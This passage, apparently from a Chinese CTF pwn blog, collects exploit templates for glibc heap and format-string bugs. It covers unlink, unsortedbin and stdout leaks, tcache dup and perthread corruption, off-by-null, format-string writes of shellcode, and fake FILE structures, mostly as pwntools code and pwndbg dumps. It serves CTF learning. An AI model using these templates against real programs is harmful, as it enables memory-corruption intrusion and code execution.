<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10xg list_addr(buf[<span class="number">0</span>])</span><br><span class="line"><span class="number">0x602140</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000e0a020</span></span><br><span class="line"><span class="number">0x602150</span>:	<span class="number">0x0000000000602138</span>	<span class="number">0x0000000000000000</span>	<span class="comment">#fake_chunk2</span></span><br><span class="line"><span class="number">0x602160</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="comment">#演示程序的buf[0]没有chunk</span></span><br><span class="line"><span class="comment">#buf[1]为chunk1，用于初始化</span></span><br><span class="line"><span class="comment">#buf[2]为fake_chunk2，是攻击对象</span></span><br><span class="line"><span class="comment">#buf[3]为chunk3，已经被free</span></span><br></pre></td></tr></table></figure>
<p>接下来修改“chunk2”就可以直接修改“list_addr”（“buf[0]”）了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(elf.got[<span class="string">&#x27;target1&#x27;</span>]) <span class="comment">#fake_chunk0</span></span><br><span class="line">payload+=p64(elf.got[<span class="string">&#x27;target2&#x27;</span>]) <span class="comment">#fake_chunk1</span></span><br><span class="line">payload+=p64(elf.got[<span class="string">&#x27;target3&#x27;</span>]) <span class="comment">#fake_chunk2</span></span><br><span class="line">fill(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>
<p>​        // 程序会在“buf[-1]”（buf[2-3]）开始写入数据</p>
<p><strong>基于heap_addr</strong>（泄露“heap_addr”+泄露“libc_base”+后续利用）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak libc_base</span></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">8</span></span><br><span class="line">libc_base=leak_addr-<span class="number">0x3c4b00</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap_addr</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">8</span></span><br><span class="line">heap_addr=leak_addr-<span class="number">240</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;heap_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># unlink for overlapping</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0xb1</span>) <span class="comment"># fake chunk-&gt;size</span></span><br><span class="line">payload+=p64(heap_addr+<span class="number">0x18</span>)+p64(heap_addr+<span class="number">0x20</span>)+p64(heap_addr+<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x40</span>,payload)<span class="comment">#0</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0xb0</span>))<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">2</span>) <span class="comment"># fake chunk-&gt;size=0xb1+0x100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># after unlink</span></span><br><span class="line">add(<span class="number">0xc0</span>,<span class="string">&#x27;AAAA&#x27;</span>)<span class="comment">#2(malloc form unsortedbin &quot;0x40+0x10&quot;+&quot;0x60+0x10&quot;)</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;BBBB&#x27;</span>)<span class="comment">#3(avoid top chunk and adjust the size of unsortedbin)</span></span><br><span class="line">delete(<span class="number">1</span>) <span class="comment"># lead chunk1 to fastbin</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xc0</span>,flat(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x38</span>,<span class="number">0x71</span>,fake_target)) </span><br><span class="line"><span class="comment"># make fake_target to unsortedbin and then to fastbin(0x70)</span></span><br><span class="line">add(<span class="number">0x60</span>,payload) <span class="comment"># malloc the fake_target and change it</span></span><br></pre></td></tr></table></figure>
<ul>
<li>先构造泄露 heap_addr 的结构，再构造泄露 libc_base 的结构</li>
<li>要求 unlink 跳过中间那个chunk，基于这点构造“fake chunk-&gt;size”和“last chunk-&gt;fake presize”</li>
<li>释放chunk1，使chunk1进入fastbin</li>
<li>申请“0x60”字节的目的有二：防止 top chunk 合并，调整 unsortedbin 的大小（使其可以进入fastbin）</li>
<li>申请“0xC0”字节释放后，可以控制已经在fastbin中的chunk1，从而申请到目标地址</li>
</ul>
<h2 id="Unsortedbin-Leak模板"><a href="#Unsortedbin-Leak模板" class="headerlink" title="Unsortedbin Leak模板"></a>Unsortedbin Leak模板</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>, <span class="string">&quot;A&quot;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">&quot;B&quot;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">&quot;C&quot;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">&quot;D&quot;</span>*<span class="number">0x80</span>)</span><br><span class="line">delete(<span class="number">3</span>) <span class="comment"># 注意:这里要先释放后申请的chunk,不然程序不会打印(不知道原因)</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>chunk1：leak heap_addr</li>
<li>chunk3：leak main_arena</li>
</ul>
<h2 id="格式化字符串漏洞模板"><a href="#格式化字符串漏洞模板" class="headerlink" title="格式化字符串漏洞模板"></a>格式化字符串漏洞模板</h2><p><strong>WAA模板</strong></p>
<p>通常需要在两片内存空间中，最后指向的地址相同（“偏移N”，“偏移M”）</p>
<p>例如：实现“ 目标地址 =&gt; shellcode ”</p>
<ul>
<li>找寻：最后指向地址相同的两片空间（“偏移N”，“偏移M”）</li>
<li>把“目标地址”写入“偏移N”</li>
<li>对应的“偏移M”最终也会指向“目标地址”</li>
<li>把“shellcode”写入“偏移M”（其实就是把“shellcode”写入“目标地址”了）</li>
</ul>
<p>通常需要分段写入地址，先写入高地址，所以模板为：（每次修改2字节）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%N$hn\n&quot;</span>.<span class="built_in">format</span>(target_addr_in_stack + <span class="number">6</span>) <span class="comment"># last 6~8</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%M$hn\n&quot;</span>.<span class="built_in">format</span>((shellcode_addr &gt;&gt; <span class="number">16</span>*<span class="number">3</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%N$hn\n&quot;</span>.<span class="built_in">format</span>(target_addr_in_stack + <span class="number">4</span>) <span class="comment"># last 4~6</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%M$hn\n&quot;</span>.<span class="built_in">format</span>((shellcode_addr &gt;&gt; <span class="number">16</span>*<span class="number">2</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%N$hn\n&quot;</span>.<span class="built_in">format</span>(target_addr_in_stack + <span class="number">2</span>) <span class="comment"># last 2~4</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%M$hn\n&quot;</span>.<span class="built_in">format</span>((shellcode_addr &gt;&gt; <span class="number">16</span>*<span class="number">1</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%N$hn\n&quot;</span>.<span class="built_in">format</span>(target_addr_in_stack) <span class="comment"># last 0~2</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%M$hn\n&quot;</span>.<span class="built_in">format</span>(shellcode_addr &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
<p><strong>leak模板</strong></p>
<p>格式化字符串的 leak 很简单，只需要输入若干“-%p”，并在GDB中确认格式化参数的地址后，就可以计算出各个地址的偏移了</p>
<p>​        // 前6个是寄存器中存放的值（在stack中也有），后续的信息才是重点</p>
<p>实现 leak 了之后，首先需要寻找“最后指向地址相同”的内存空间，方便以后的 WAA</p>
<h2 id="Tcache-Attack-模板"><a href="#Tcache-Attack-模板" class="headerlink" title="Tcache Attack 模板"></a>Tcache Attack 模板</h2><p>Tcache Attack的形式多种多样，遇到一个记录一个</p>
<p><strong>Tcache leak</strong></p>
<p>如果程序拥有“打印模块”，就先可以填满 Tcachebin，然后打 Unsortedbin leak</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">9</span>):</span><br><span class="line">	add(i,<span class="number">0x100</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">7</span>):</span><br><span class="line">	delete(i)</span><br><span class="line">	</span><br><span class="line">delete(<span class="number">7</span>) <span class="comment"># chunk8 into Unsortedbin </span></span><br></pre></td></tr></table></figure>
<p>申请9个chunk：7个填Tcachebin，1个leak，1个防止和合并Top chunk</p>
<p><strong>Tcache dup</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">delete(index)</span><br><span class="line">edit(index,<span class="string">&quot;\x00&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">delete(index)</span><br><span class="line"></span><br><span class="line">edit(index,p64(target))</span><br><span class="line">add(size)</span><br><span class="line">add(size) <span class="comment"># malloc the target</span></span><br></pre></td></tr></table></figure>
<ul>
<li>释放 chunk ，覆盖 “chunk-&gt;FD，chunk-&gt;BK” 为“\x00” ，再次释放</li>
<li>利用修改模块覆写上 target</li>
<li>连续两次申请获取 target</li>
</ul>
<p><strong>Tcache perthread corruption</strong></p>
<p>一，打 count 获取 unsorted chunk：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">delete(index) <span class="comment"># Tcache dup</span></span><br><span class="line">edit(index,<span class="string">&quot;\x00&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">delete(index)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;\x00&quot;</span>*<span class="number">0x48</span> + p64(<span class="number">0x0007000000000000</span>) <span class="comment"># cover count to &#x27;7&#x27;</span></span><br><span class="line"></span><br><span class="line">edit(index,p64(heap_base + <span class="number">0x10</span>)) <span class="comment"># tcache_perthread_struct-&gt;next</span></span><br><span class="line">add(size)</span><br><span class="line">add(size,payload) <span class="comment"># malloc the tcache_perthread_struct</span></span><br><span class="line">delete(index)</span><br></pre></td></tr></table></figure>
<ul>
<li>注意：tcache-&gt;next 和常规的FD指针相似但不同，FD指向 nextchunk-&gt;presize ，而 next 指向 nextchunk-&gt;next </li>
<li>利用 Tcache dup 申请到“tcache_perthread_struct”（第一个chunk）</li>
<li>修改对应“tcache_perthread_struct-&gt;size”的“count”为“7”（偏移可以在GDB中看）</li>
<li>释放“tcache_perthread_struct”使其进入“unsortedbin”</li>
</ul>
<p>二，打 tcache_entry 劫持 tcachebin：</p>
<p>这个很灵活，不好用代码表示，这里我挂上几个堆风水：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, p16(<span class="built_in">stdout</span>))</span><br><span class="line">add(<span class="number">0x58</span>, p64(<span class="number">0xfdad2887</span> | <span class="number">0x1000</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + b<span class="string">&quot;\x00&quot;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x558b1cfcd000</span></span><br><span class="line"><span class="number">0x558b1cfcd000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span> <span class="comment">// add</span></span><br><span class="line"><span class="number">0x558b1cfcd010</span>:	<span class="number">0x0001000200000000</span>	<span class="number">0x0000000000000001</span></span><br><span class="line"><span class="number">0x558b1cfcd020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span> <span class="comment">// add</span></span><br><span class="line"><span class="number">0x558b1cfcd060</span>:	<span class="number">0x0000000558b1ce3c</span>	<span class="number">0x0000558b1cfcd010</span> <span class="comment">// delete</span></span><br><span class="line"><span class="number">0x558b1cfcd070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd0a0</span>:	<span class="number">0x0000558b1cfcd0b0</span>	<span class="number">0x0000558b1cfcd060</span> <span class="comment">// &#x27;0x40&#x27;的tcache</span></span><br><span class="line">    		<span class="comment">/* 伪造&#x27;0x40&#x27;的tcache(带有main_arena) */</span> </span><br><span class="line"><span class="number">0x558b1cfcd0b0</span>:	<span class="number">0x00007fea097ddc00</span>	<span class="number">0x00007fea097ddc00</span> <span class="comment">// &#x27;0x60&#x27;的tcache</span></span><br><span class="line">    		<span class="comment">/* 这里曾经是unsortedbin,所以main_arena留下来了 */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x40</span> [  <span class="number">2</span>]: <span class="number">0x558b1cfcd0b0</span> ◂— <span class="number">0x7fef51cc13cd</span></span><br><span class="line"><span class="number">0x50</span> [  <span class="number">1</span>]: <span class="number">0x558b1cfcd060</span> ◂— <span class="number">0x1f1</span> </span><br><span class="line"><span class="number">0x60</span> [  <span class="number">1</span>]: <span class="number">0x7fea097ddc00</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x558ce25c44cd</span></span><br></pre></td></tr></table></figure>
<ul>
<li>注意：因为 tcache 的性质，在对应“size的tcache”中写入地址，就会申请这个地址作为“tcache-&gt;next”（也就是说，数据会直接写入该地址）</li>
<li>关键在于：使 <code>&#39;0x40&#39; tcache</code> 中装有 <code>&#39;0x50&#39; tcache addr</code> ，使其可以通过申请“0x30”来修改 <code>&#39;0x50&#39; tcache</code> 的地址（劫持大小为“0x50”的tcachebin）</li>
</ul>
<h2 id="Off-By-Null模板（基于read）"><a href="#Off-By-Null模板（基于read）" class="headerlink" title="Off-By-Null模板（基于read）"></a>Off-By-Null模板（基于read）</h2><p>有些程序为了“打印模块”的安全性，会在read完成后加一个“\x00”，造成了off-by-null</p>
<p>例如：<em>( </em>(&amp;list + index)  + read(0, *(&amp;list + index) , size) ) = 0 </p>
<p><strong>有Tcache：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">11</span>):</span><br><span class="line">	add(i, <span class="number">0xF8</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0xF0</span>+<span class="string">&quot;b&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">10</span>):</span><br><span class="line">	delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0xF0</span> + p64(<span class="number">0x200</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x70</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x70</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>覆盖前：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x55a67dfb3450</span>:	<span class="number">0x6262626262626262</span>	<span class="number">0x0000000000000101</span> # chunk2(allocated)</span><br><span class="line"><span class="number">0x55a67dfb3460</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x55a67dfb3470</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br></pre></td></tr></table></figure>
<p>覆盖后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x561f0e5bf450</span>:	<span class="number">0x0000000000000200</span>	<span class="number">0x0000000000000100</span> # chunk2(allocated)</span><br><span class="line"><span class="number">0x561f0e5bf460</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x561f0e5bf470</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br></pre></td></tr></table></figure>
<p>导致程序误以为chunk0(free)是chunk2相邻的上一个chunk，在释放chunk2后，会导致chunk0，chunk1，chunk2，三者合并为free_chunk</p>
<p>两次申请“0x80”大小的chunk后，free_chunk刚好和chunk1_old重合，把“arena_main + xx”写入chunk1_old，这之后就可以利用“打印模块”进行泄露了</p>
<h2 id="IO-2-1-stdout-Leak-模板"><a href="#IO-2-1-stdout-Leak-模板" class="headerlink" title="IO_2_1_stdout Leak 模板"></a>IO_2_1_stdout Leak 模板</h2><p><strong>基于 Double free</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span>	</span><br><span class="line">    <span class="comment"># lead target to chunk2</span></span><br><span class="line">    add(<span class="number">0x60</span>) <span class="comment"># chunk0</span></span><br><span class="line">	add(<span class="number">0x90</span>) <span class="comment"># chunk1</span></span><br><span class="line">	add(<span class="number">0x60</span>) <span class="comment"># chunk2</span></span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line">	_IO_2_1_stdout_s = libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">	add(<span class="number">0x90</span>,p16((<span class="number">2</span> &lt;&lt; <span class="number">12</span>) + ((_IO_2_1_stdout_s-<span class="number">0x43</span>) &amp; <span class="number">0xFFF</span>))) </span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Double free to leak libc_base</span></span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	delete(<span class="number">2</span>)</span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	add(<span class="number">0x60</span>,padding) <span class="comment"># cover &quot;chunk0-&gt;FD&quot; to make chunk1 into fastbin</span></span><br><span class="line">	add(<span class="number">0x60</span>) <span class="comment"># can change</span></span><br><span class="line">	add(<span class="number">0x60</span>)</span><br><span class="line">	add(<span class="number">0x60</span>)</span><br><span class="line">	add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">&#x27;\x00&#x27;</span>) <span class="comment"># malloc the target</span></span><br><span class="line">	libc_base=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-offset</span><br></pre></td></tr></table></figure>
<ul>
<li>整个过程在循环中进行，有 1/16 的概率可以成功</li>
<li>把 chunk1 放入 unsortedbin 然后覆盖 main_arena 为 target</li>
<li>进行 Double free ，然后覆盖“chunk0-&gt;FD”，使其指向 chunk1</li>
<li>申请 target 修改 <code>_IO_2_1_stdout_</code> 的“flag”为“0xfbad1800”，将后面三个read指针置空，将 <code>_IO_write_base</code> 处的第一个字节改为“0”</li>
</ul>
<p>这里一定是：先覆盖 main_arena ，后 Double free 把它链入 fastbin</p>
<h2 id="FILE结构体模板"><a href="#FILE结构体模板" class="headerlink" title="FILE结构体模板"></a>FILE结构体模板</h2><p>这个模板主要是个函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FILE</span>(<span class="params">_flags=<span class="number">0</span>,_IO_read_ptr=<span class="number">0</span>,_IO_read_end=<span class="number">0</span>,_IO_read_base=<span class="number">0</span>,_IO_write_base=<span class="number">0</span>,_IO_write_ptr=<span class="number">0</span>,_IO_write_end=<span class="number">0</span>,_IO_buf_base=<span class="number">0</span>,_IO_buf_end=<span class="number">1</span>,_fileno=<span class="number">0</span>,_chain=<span class="number">0</span></span>):</span></span><br><span class="line">	fake_IO = flat([</span><br><span class="line">	_flags,</span><br><span class="line">	_IO_read_ptr, _IO_read_end, _IO_read_base,</span><br><span class="line">	_IO_write_base, _IO_write_ptr, _IO_write_end,</span><br><span class="line">	_IO_buf_base, _IO_buf_end])</span><br><span class="line">	fake_IO += flat([<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,_chain,_fileno])</span><br><span class="line">	fake_IO += flat([<span class="number">0xFFFFFFFFFFFFFFFF</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xFFFFFFFFFFFFFFFF</span>,<span class="number">0</span>,<span class="number">0</span>])</span><br><span class="line">	fake_IO += flat([<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xFFFFFFFF</span>,<span class="number">0</span>,<span class="number">0</span>])</span><br><span class="line">	<span class="keyword">return</span> fake_IO</span><br></pre></td></tr></table></figure>
<p>用它可以快速伪造 FILE 结构体</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/" class="post-title-link" itemprop="url">从CSapp中收获的知识（持续更新）</a>
        </h2>

        <div class="post-meta">
